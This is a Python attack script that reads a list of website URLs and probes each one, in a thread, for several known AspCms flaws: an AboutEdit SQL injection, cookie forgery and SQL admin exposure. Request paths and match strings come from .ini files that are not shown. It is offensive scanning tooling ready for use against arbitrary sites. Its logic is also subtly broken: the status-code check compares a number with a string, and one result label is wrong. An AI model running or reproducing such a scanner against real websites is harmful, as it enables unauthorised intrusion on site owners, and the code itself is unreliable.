import requests
import os
import threading
import configparser

cz=[]
user=input('jiu@url:')
def pd():
    if os.path.exists(user):
        print('[+]Opens {} ok'.format(user))
    else:
        print('[-]Not {} Found'.format(user))
        exit()

def exploit(xian):
    print(xian)
    ok=[]
    no=[]
    errors=['404','Not Found','500','360','502','安全狗','防火墙','百度云加速','已被拦截','无权访问','云锁','D盾']
    headers={'user-agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.84 Safari/537.36'}
    print('''
    [0]AspCms_AboutEdit_sqlinject
    [1]AspCms_cookies_faker_1
    [2]AspCms_cookies_faker_2
    [3]AspCms_cookies_faker_3
    [4]AspCms_sql_admin
    ''')
    all=input('Start all->[y/n/l]')
    if all=='y':
        AspCms_AboutEdit_sqlinject='AspCms_AboutEdit_sqlinjectTrue'
        AspCms_cookies_faker_1='AspCms_cookies_faker_1True'
        AspCms_cookies_faker_2='AspCms_cookies_faker_2True'
        AspCms_cookies_faker_3='AspCms_cookies_faker_3True'
        AspCms_sql_admin='AspCms_sql_adminTrue'
        AspCms_sql_admin2='AspCms_sql_admin2True'
        cz.append(AspCms_AboutEdit_sqlinject)
        cz.append(AspCms_cookies_faker_1)
        cz.append(AspCms_cookies_faker_2)
        cz.append(AspCms_cookies_faker_3)
        cz.append(AspCms_sql_admin)
        cz.append(AspCms_sql_admin2)
    elif all=='n':
        aspall=input('Start Aspcmsall->[y/n]')
        if aspall=='y':
            AspCms_AboutEdit_sqlinject = 'AspCms_AboutEdit_sqlinjectTrue'
            AspCms_cookies_faker_1 = 'AspCms_cookies_faker_1True'
            AspCms_cookies_faker_2 = 'AspCms_cookies_faker_2True'
            AspCms_cookies_faker_3 = 'AspCms_cookies_faker_3True'
            AspCms_sql_admin='AspCms_sql_adminTrue'
            AspCms_sql_admin2='AspCms_sql_admin2True'
            cz.append(AspCms_AboutEdit_sqlinject)
            cz.append(AspCms_cookies_faker_1)
            cz.append(AspCms_cookies_faker_2)
            cz.append(AspCms_cookies_faker_3)
            cz.append(AspCms_sql_admin)
            cz.append(AspCms_sql_admin2)
    elif all=='l':
        xw=input('AspCms_AboutEdit_sqlinject->[y/n]')
        xw2=input('AspCms_cookies_faker_1->[y/n]')
        xw3=input('AspCms_cookies_faker_2->[y/n]')
        xw4=input('AspCms_cookies_faker_3->[y/n]')
        xw5=input('AspCms_sql_admin->[y/n]')
        xw6=input('AspCms_sql_admin2->[y/n]')

        if xw=='y':
            AspCms_AboutEdit_sqlinject='AspCms_AboutEdit_sqlinjectTrue'
            cz.append(AspCms_AboutEdit_sqlinject)
        else:
            AspCms_AboutEdit_sqlinject=False

        if xw2=='y':
            AspCms_cookies_faker_1='AspCms_cookies_faker_1True'
            cz.append(AspCms_cookies_faker_1)
        else:
            AspCms_cookies_faker_1=False

        if xw3=='y':
            AspCms_cookies_faker_2='AspCms_cookies_faker_2True'
            cz.append(AspCms_cookies_faker_2)
        else:
            AspCms_cookies_faker_2=False

        if xw4=='y':
            AspCms_cookies_faker_3='AspCms_cookies_faker_3True'
            cz.append(AspCms_cookies_faker_3)
        else:
            AspCms_cookies_faker_3=False

        if xw5=='y':
            AspCms_sql_admin='AspCms_sql_adminTrue'
            cz.append(AspCms_sql_admin)
        else:
            AspCms_sql_admin=False

        if xw6=='y':
            AspCms_sql_admin2='AspCms_sql_admin2True'
            cz.append(AspCms_sql_admin2)
        else:
            AspCms_sql_admin2=False

    dk = open('{}'.format(user), 'r')
    for r in dk.readlines():
        url = "".join(r.split('\n')).rstrip('/')
        for c in cz:
            if 'AspCms_AboutEdit_sqlinjectTrue' in c:
                dq=configparser.ConfigParser()
                dq.read('asp_cms/AspCms_AboutEdit_sqlinject.ini',encoding='gbk')
                urls1='{}{}'.format(url,dq.get('Test404','请求路径'))
                reqt1=requests.get(url=urls1,headers=headers,allow_redirects=False)
                if dq.get('Test404','特征文本') in reqt1.text and reqt1.status_code==dq.get('Test404','状态码2'):
                    print('[+]AspCms_AboutEdit_sqlinject URL:{}'.format(reqt1.url))
                else:
                    print('[-]Not  AspCms_AboutEdit_sqlinjectTrue url:{}:'.format(urls1))

            if 'AspCms_cookies_faker_1True' in c:
                dq2=configparser.ConfigParser()
                dq2.read('asp_cms/AspCms_cookies_faker_1.ini',encoding='gbk')
                urls2='{}{}'.format(url,dq2.get('Test404','请求路径'))
                reqt2=requests.get(url=urls2,headers=headers,allow_redirects=False)
                if dq2.get('Test404','特征文本') in reqt2.text and reqt2.status_code==dq2.get('Test404','状态码2'):
                    print('[+]AspCms_cookies_faker_1 URL:{}'.format(reqt2.url))
                else:
                    print('[-]Not AspCms_cookies_faker_1 url:{}'.format(reqt2.url))

            if 'AspCms_cookies_faker_2True' in c:
                dq3=configparser.ConfigParser()
                dq3.read('asp_cms/AspCms_cookies_faker_2.ini',encoding='gbk')
                urls3='{}{}'.format(url,dq3.get('Test404','请求路径'))
                reqt3=requests.get(url=urls3,headers=headers,allow_redirects=False)
                if dq3.get('Test404','特征文本') in reqt3.text and reqt3.status_code==dq3.get('Test404','状态码2'):
                    print('[+]AspCms_cookies_faker_2 URL:{}'.format(reqt3.url))
                else:
                    print('[-]Not AspCms_cookies_faker_2 url:{}'.format(reqt3.url))

            if 'AspCms_cookies_faker_3True' in c:
                dq4 = configparser.ConfigParser()
                dq4.read('asp_cms/AspCms_cookies_faker_3.ini', encoding='gbk')
                urls4 = '{}{}'.format(url, dq4.get('Test404', '请求路径'))
                reqt4 = requests.get(url=urls4, headers=headers, allow_redirects=False)
                if dq4.get('Test404', '特征文本') in reqt4.text and reqt4.status_code == dq4.get('Test404', '状态码2'):
                    print('[+]AspCms_cookies_faker_4 URL:{}'.format(reqt4.url))
                else:
                    print('[-]Not AspCms_cookies_faker_4 url:{}'.format(reqt4.url))

            if 'AspCms_sql_adminTrue' in c:
                dq5=configparser.ConfigParser()
                dq5.read('asp_cms/AspCms_sql_admin.ini',encoding='gbk')
                urls5='{}{}'.format(url,dq5.get('Test404','请求路径'))
                reqt5=requests.get(url=urls5,headers=headers,allow_redirects=False)
                if dq5.get('Test404','特征文本') in reqt5.text and reqt5.status_code==dq5.get('Test404','状态码2'):
                    print('[+]AspCms_sql_admin URL:{}'.format(reqt5.url))
                else:
                    print('[-]Not AspCms_sql_admin url:{}'.format(reqt5.url))

            if 'AspCms_sql_admin2True' in c:
                dq6=configparser.ConfigParser()
                dq6.read('asp_cms/AspCms_sql_admin_2.ini',encoding='gbk')
                urls6='{}{}'.format(url,dq6.get('Test404','请求路径'))
                reqt6=requests.get(url=urls6,headers=headers,allow_redirects=False)
                if dq6.get('Test404','特征文本') in reqt6.text and reqt6.status_code==dq6.get('Test404','状态码2'):
                    print('[+]AspCms_sql_admin2 URL:{}'.format(reqt6.url))
                else:
                    print('[-]Not AspCms_sql_admin2 url:{}'.format(reqt6.url))

xis=50
t=threading.Thread(target=exploit,args=(xis,))
t.start()